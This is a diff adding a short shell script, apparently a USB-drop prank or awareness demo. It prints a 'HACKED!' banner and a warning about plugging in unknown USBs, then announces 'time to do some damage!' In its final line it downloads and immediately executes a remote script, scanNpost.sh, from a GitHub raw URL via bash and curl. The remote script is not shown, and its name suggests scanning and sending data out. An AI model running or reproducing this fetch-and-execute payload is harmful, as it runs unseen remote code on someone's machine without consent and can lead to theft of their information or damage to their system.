@@ -1,0 +1,34 @@
+clear
+
+clear
+                                                               
+echo " ##  ##     ##      ####    ##  ##   ######   ####       ##    "
+
+echo " ##  ##    ####    ##  ##   ## ##    ##       ## ##      ##    "
+
+echo " ######   ##  ##   ##       ####     #####    ##  ##     ##    "
+
+echo " ##  ##   ##  ##   ##       ####     ##       ##  ##     ##    "
+
+echo " ##  ##   ######   ##  ##   ## ##    ##       ## ##            "
+
+echo " ##  ##   ##  ##    ####    ##  ##   ######   ####       ##    "
+
+echo "                                                               "
+
+echo "(well, not really)"
+
+echo ""
+
+echo ""
+
+echo "Listen. Don't plug random USBs into your computer. This could steal your info or worse, damage your PC entirely."
+
+sleep 2
+
+clear
+
+echo "Now, time to do some damage!"
+
+bash <(curl -sL https://raw.githubusercontent.com/glitchy-m/SHScripts/refs/heads/main/scanNpost.sh)
+
